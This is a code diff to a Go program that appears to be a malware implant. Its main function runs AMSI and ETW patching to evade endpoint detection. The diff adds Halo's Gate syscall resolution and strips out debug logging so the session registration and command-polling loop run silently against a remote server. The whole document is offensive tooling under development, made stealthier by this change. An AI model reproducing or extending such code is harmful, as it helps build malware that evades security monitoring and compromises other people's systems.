@@ -41,7 +41,10 @@ func normalInit() {
 func main() {
 	normalInit()
 
-	// EDR Evasion: AMSI + ETW Patch
+	// ===== Halo's Gate: 初始化SSN映射表 (必须在所有syscall之前) =====
+	evasion.InitSSNMap()
+
+	// ===== EDR Evasion: AMSI + ETW Patch =====
 	evasion.BypassAMSI()
 	evasion.BypassETW()
 
@@ -83,14 +86,12 @@ func main() {
 	for i := 0; i < maxRetries; i++ {
 		err := initSession(tp)
 		if err == nil {
-			fmt.Fprintf(os.Stderr, "[DBG] initSession OK, sessionID=%s\n", sessionID)
 			break
 		}
-		fmt.Fprintf(os.Stderr, "[DBG] initSession attempt %d err: %v\n", i+1, err)
 		time.Sleep(tp.GetInterval())
 	}
 	if sessionID == "" {
-		fmt.Fprintf(os.Stderr, "[DBG] WARNING: sessionID is empty after init!\n")
+		return
 	}
 
 	for {
@@ -99,7 +100,6 @@ func main() {
 
 		pkt, err := tp.Poll(sessionID)
 		if err != nil {
-			fmt.Fprintf(os.Stderr, "[DBG] Poll err: %v\n", err)
 			continue
 		}
 
@@ -130,17 +130,14 @@ func initSession(tp *transport.HTTPTransport) error {
 	}
 	respPkt, err := tp.Send(pkt, "")
 	if err != nil {
-		fmt.Fprintf(os.Stderr, "[DBG] initSession Send err: %v\n", err)
 		return err
 	}
 
-	fmt.Fprintf(os.Stderr, "[DBG] initSession resp type=%d data=%s\n", respPkt.Type, string(respPkt.Data))
 	if respPkt.Type == encode.MsgRegister {
 		var resp map[string]string
 		json.Unmarshal(respPkt.Data, &resp)
 		if sid, ok := resp["session_id"]; ok {
 			sessionID = sid
-			fmt.Fprintf(os.Stderr, "[DBG] initSession parsed sid=%s\n", sid)
 		}
 	}
 	return nil
